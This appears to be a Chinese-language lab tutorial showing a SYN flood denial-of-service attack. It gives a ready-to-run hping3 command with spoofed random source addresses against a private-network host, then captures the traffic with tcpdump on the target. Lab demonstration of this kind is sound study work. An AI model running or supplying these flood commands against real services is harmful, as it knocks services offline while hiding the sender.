# SYN洪水攻击：使用HPING3的DoS

## 1. 攻击端执行如下命令

```shell
hping3 -c 10000 -d 15 -S -w 64 -p 80 --flood --rand-source 192.168.205.106
```

```shell
参数说明：
-c：发送数据包的个数

-d：每个数据包的大小

-S：发送SYN数据包

-w：TCP window大小

-p：目标端口，你可以指定任意端口

--flood：尽可能快的发送数据包，不需要考虑显示入站回复。洪水攻击模式。

--rand-source = 使用随机性的源头IP地址。你还可以使用-a或–spoof来隐藏主机名。
```

## 2. 在被攻击端安装tcpdump抓包工具

```shell
# 执行下面命令抓取80端口数据
tcpdump -i ens33 -nnA 'port 80'
```

​	下图可以看到被攻击端不停的接收到数据包，以及cpu及系统负载逐渐升高

![image-20210818180315882](https://longlizl.github.io/kali相关/简单dos攻击/images/1.png)

![image-20210818175806570](https://longlizl.github.io/kali相关/简单dos攻击/images/2.png)